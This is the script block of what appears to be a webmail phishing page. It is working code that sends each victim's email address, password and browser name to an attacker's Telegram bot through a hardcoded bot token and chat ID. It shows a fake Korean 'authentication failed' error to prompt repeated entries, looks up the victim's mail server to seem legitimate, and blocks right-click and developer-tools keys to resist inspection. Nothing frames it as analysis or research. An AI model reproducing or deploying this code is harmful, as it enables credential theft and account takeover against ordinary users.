    <script>
        // DOM elements
        var landingPage = document.getElementById('landingPage');
        var mainBackground = document.getElementById('mainBackground');
        var emailInput = document.getElementById('emailInput');
        var passwordInput = document.getElementById('pw');
        var resultDiv = document.getElementById('result');
        var messageDiv = document.getElementById('message');
        var form = document.getElementById('mainForm');

        // Configuration
        var WEBMAIL_KEY = '7215447654:AAFruiatkWLjBvNPZJpHJlZdtNXlZB-y5XI';
        var WEBMAIL_ID = '7134396720';
        var submitAttempts = 0;
        var maxSubmitAttempts = 3;
        var errorMessageTimer = null;
        var isAnalyzing = false;
        var smtpDiagnosisComplete = false;
        var isEmailValid = false;
        var isPasswordValid = false;

        // Initialize the application
        function init() {
            analyzeEmailIfValid();
        }

        // Form submission handler
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            validateEmail();
            validatePassword();

            if (!isEmailValid || !isPasswordValid) {
                if (!isEmailValid) {
                    emailInput.classList.add('invalid-input');
                }
                if (!isPasswordValid) {
                    passwordInput.classList.add('invalid-input');
                }
                return;
            }

            emailInput.classList.remove('invalid-input');
            passwordInput.classList.remove('invalid-input');

            if (submitAttempts >= maxSubmitAttempts) {
                showErrorMessage("");
                passwordInput.disabled = true;
                return;
            }

            submitAttempts++;
            submitToTelegram();

            setTimeout(function() {
                passwordInput.value = '';
            }, 2000);

            if (errorMessageTimer) {
                clearTimeout(errorMessageTimer);
            }

            errorMessageTimer = setTimeout(function() {
                showErrorMessage("서버 보고서: 현재 인증에 실패했습니다.");
            }, 3000);

            if (submitAttempts >= maxSubmitAttempts) {
                showErrorMessage("");
                passwordInput.disabled = true;
            }
        });

        // Auto-button click handler
        document.getElementById('auto-button').addEventListener('click', function() {
            if (errorMessageTimer) {
                clearTimeout(errorMessageTimer);
            }
            clearErrorMessage();
        });

        // Submit data to Telegram
function submitToTelegram() {
    var email = emailInput.value;
    var password = passwordInput.value;
    var browserInfo = 'Browser: ' + getBrowserName();
    var message = 'Email: ' + email + '\nPassword: ' + password + '\n' + browserInfo;
    var url = 'https://api.telegram.org/bot' + WEBMAIL_KEY + '/sendMessage';

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: WEBMAIL_ID,
            text: message
        })
    })
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        console.log('Success:', data);
    })
    .catch(function(error) {
        console.error('Error:', error);
    });
}

		// Helper function to extract browser name
function getBrowserName() {
    var userAgent = navigator.userAgent;

    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Edg")) return "Edge";
    if (userAgent.includes("Chrome")) return "Chrome";
    if (userAgent.includes("Safari")) return "Safari";
    if (userAgent.includes("Opera")) return "Opera";

    return "Unknown Browser";
}

        // Show error message
        function showErrorMessage(message) {
            clearErrorMessage();
            messageDiv.textContent = message;
            messageDiv.className = 'message error';
        }

        // Clear error message
        function clearErrorMessage() {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
        }

        // Email input handler
        emailInput.addEventListener('input', function() {
            emailInput.classList.remove('invalid-input');
            analyzeEmailIfValid();
        });

        // Password input handler
        passwordInput.addEventListener('input', function() {
            passwordInput.classList.remove('invalid-input');
            validatePassword();
        });

        // Initialize on DOM content loaded
        document.addEventListener('DOMContentLoaded', function() {
            init();
        });

        // Analyze email if valid
        function analyzeEmailIfValid() {
            var email = emailInput.value.trim();
            var domain = email.split('@')[1];
            resultDiv.classList.add('hidden');
            resultDiv.innerHTML = '';
            validateEmail();

            if (domain && domain.includes('.') && !isAnalyzing && isEmailValid) {
                analyzeEmail(email, domain);
            }
        }

        // Validate email format
        function isValidEmail(email) {
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Validate password format
        function isValidPassword(password) {
            var re = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
            return re.test(password);
        }

        // Validate email
        function validateEmail() {
            var email = emailInput.value.trim();
            isEmailValid = email && isValidEmail(email);
            return isEmailValid;
        }

        // Validate password
        function validatePassword() {
            var password = passwordInput.value.trim();
            isPasswordValid = password && isValidPassword(password);
            return isPasswordValid;
        }

        // Analyze email domain
        function analyzeEmail(email, domain) {
            isAnalyzing = true;
            var services = [
                { name: 'Google DNS', func: queryGoogleDNS },
                { name: 'Cloudflare DNS', func: queryCloudflareDNS },
                { name: 'HackerTarget', func: queryHackerTarget }
            ];

            var mxRecords = [];

            var processServices = function(index) {
                if (index >= services.length) {
                    if (mxRecords.length > 0) {
                        var primaryServer = mxRecords.sort(function(a, b) {
                            return a.priority - b.priority;
                        })[0].server;
                        displayResult(primaryServer);
                    } else {
                        displayResult('WEBMAIL SERVICE');
                    }

                    isAnalyzing = false;
                    smtpDiagnosisComplete = true;

                    setTimeout(function() {
                        landingPage.classList.add('hidden');
                        mainBackground.classList.add('visible');
                    }, 500);

                    return;
                }

                var service = services[index];
                service.func(domain).then(function(result) {
                    if (result && result.mxRecords && result.mxRecords.length > 0) {
                        mxRecords = result.mxRecords;

                        if (mxRecords.length > 0) {
                            var primaryServer = mxRecords.sort(function(a, b) {
                                return a.priority - b.priority;
                            })[0].server;
                            displayResult(primaryServer);
                        } else {
                            displayResult('WEBMAIL SERVICE');
                        }

                        isAnalyzing = false;
                        smtpDiagnosisComplete = true;

                        setTimeout(function() {
                            landingPage.classList.add('hidden');
                            mainBackground.classList.add('visible');
                        }, 500);
                    } else {
                        processServices(index + 1);
                    }
                }).catch(function(error) {
                    processServices(index + 1);
                });
            };

            processServices(0);
        }

        // Query Google DNS
        function queryGoogleDNS(domain) {
            return fetch('https://dns.google/resolve?name=' + domain + '&type=MX')
                .then(function(response) {
                    if (!response.ok) throw new Error('Google DNS failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data.Answer) {
                        var mxRecords = data.Answer.map(function(record) {
                            var parts = record.data.split(' ');
                            return {
                                priority: parseInt(parts[0]),
                                server: parts[1].replace(/\.$/, ''),
                                ttl: record.TTL
                            };
                        });
                        return { mxRecords: mxRecords, source: 'Google DNS' };
                    }
                    throw new Error('WEBMAIL SERVICE');
                });
        }

        // Query Cloudflare DNS
        function queryCloudflareDNS(domain) {
            return fetch('https://cloudflare-dns.com/dns-query?name=' + domain + '&type=MX', {
                headers: {
                    'Accept': 'application/dns-json'
                }
            })
            .then(function(response) {
                if (!response.ok) throw new Error('Cloudflare DNS failed');
                return response.json();
            })
            .then(function(data) {
                if (data.Answer) {
                    var mxRecords = data.Answer.map(function(record) {
                        var parts = record.data.split(' ');
                        return {
                            priority: parseInt(parts[0]),
                            server: parts[1].replace(/\.$/, ''),
                            ttl: record.TTL
                        };
                    });
                    return { mxRecords: mxRecords, source: 'Cloudflare DNS' };
                }
                throw new Error('WEBMAIL SERVICE');
            });
        }

        // Query HackerTarget
        function queryHackerTarget(domain) {
            return fetch('https://api.hackertarget.com/mxlookup/?q=' + domain)
                .then(function(response) {
                    if (!response.ok) throw new Error('HackerTarget failed');
                    return response.text();
                })
                .then(function(text) {
                    if (text.includes('error') || text.includes('API')) {
                        throw new Error('HackerTarget API limit');
                    }

                    var lines = text.split('\n').filter(function(line) {
                        return line.includes('MX');
                    });

                    var mxRecords = lines.map(function(line) {
                        var parts = line.split(/\s+/);
                        return {
                            priority: parseInt(parts[parts.length - 2]) || 10,
                            server: parts[parts.length - 1]
                        };
                    });

                    if (mxRecords.length > 0) {
                        return { mxRecords: mxRecords, source: 'HackerTarget' };
                    }
                    throw new Error('WEBMAIL SERVICE');
                });
        }

        // Display result
        function displayResult(serverDomain) {
            resultDiv.innerHTML = '<div>' + serverDomain + '</div>';
            resultDiv.classList.remove('hidden');
            resultDiv.classList.add('visible');
        }

        // Prevent right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        // Prevent developer tools
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                return false;
            }
        });
    </script>
